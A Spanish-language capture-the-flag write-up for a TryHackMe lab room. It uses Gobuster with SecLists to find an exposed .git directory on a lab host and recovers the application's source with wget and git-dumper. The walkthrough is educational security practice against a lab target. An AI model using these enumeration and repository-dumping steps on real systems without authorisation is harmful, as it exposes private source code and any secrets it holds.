# TryHackMe — Room 404

## Información

- **Target:** `10.145.150.177`
- **Puerto:** `8080`
- **Servicio:** HTTP
- **Objetivo:** Enumeración web y recuperación de un repositorio Git expuesto

---

## 1. Instalación de herramientas

Actualización de paquetes:

```bash
sudo apt update
```

Instalación de Gobuster:

```bash
sudo apt install gobuster
```

Instalación de SecLists:

```bash
sudo apt install seclists
```

---

## 2. Enumeración web

Se utilizó **Gobuster** para realizar enumeración de directorios y archivos:

```bash
gobuster dir -u http://10.145.150.177:8080/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
```

### Wordlist utilizada

```text
/usr/share/seclists/Discovery/Web-Content/quickhits.txt
```

Durante el proceso se identificó la existencia de un directorio `.git`.

---

## 3. Acceso al repositorio `.git`

Se intentó descargar el contenido del directorio `.git` utilizando `wget`:

```bash
wget -r -np -R "index.html*" http://10.145.150.177:8080/.git/
```

Posteriormente se revisaron los archivos descargados:

```bash
ls -la
cd 10.145.150.177:8080
```

Se comprobó que el contenido correspondía a un repositorio Git.

---

## 4. Extracción del repositorio con git-dumper

Para facilitar la extracción del repositorio se utilizó `git-dumper`.

### Crear entorno virtual

```bash
python3 -m venv room404
```

Activar el entorno:

```bash
source room404/bin/activate
```

Instalar `git-dumper`:

```bash
pip install git-dumper
```

### Descargar el repositorio

```bash
git-dumper http://10.145.150.177:8080/.git byte-Lotus-source-code
```

El contenido fue almacenado en:

```text
byte-Lotus-source-code
```

---

## 5. Revisión del código fuente

Se accedió al directorio descargado:

```bash
cd byte-Lotus-source-code
```

Se revisó su contenido:

```bash
ls
```

Se encontró `README.md`, cuyo contenido fue consultado:

```bash
cat README.md
```

También se revisaron archivos de la aplicación como:

```text
app.js
index.html
```

---

## 6. Finalización

Al terminar la práctica se salió del entorno virtual:

```bash
deactivate
```

---

# Comandos utilizados

Resumen de los comandos principales:

```bash
sudo apt update
sudo apt install gobuster
sudo apt install seclists

gobuster dir -u http://10.145.150.177:8080/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt

wget -r -np -R "index.html*" http://10.145.150.177:8080/.git/

python3 -m venv room404
source room404/bin/activate
pip install git-dumper

git-dumper http://10.145.150.177:8080/.git byte-Lotus-source-code

cd byte-Lotus-source-code
ls
cat README.md

deactivate
```

# Key Takeaways

- **Gobuster** puede utilizarse para descubrir directorios y archivos ocultos en aplicaciones web.
- **SecLists** proporciona wordlists útiles para tareas de enumeración.
- Un directorio **`.git` expuesto** puede permitir recuperar el código fuente de una aplicación.
- **git-dumper** facilita la reconstrucción de repositorios Git expuestos mediante HTTP.
- Los entornos virtuales de Python mediante **`venv`** permiten instalar herramientas de forma aislada.
- Es importante revisar cuidadosamente el código fuente recuperado, incluyendo archivos como `app.js`, `index.html` y `README.md`.

---

## Tools

- Linux / Kali Linux
- Gobuster
- SecLists
- Git
- git-dumper
- Python
- wget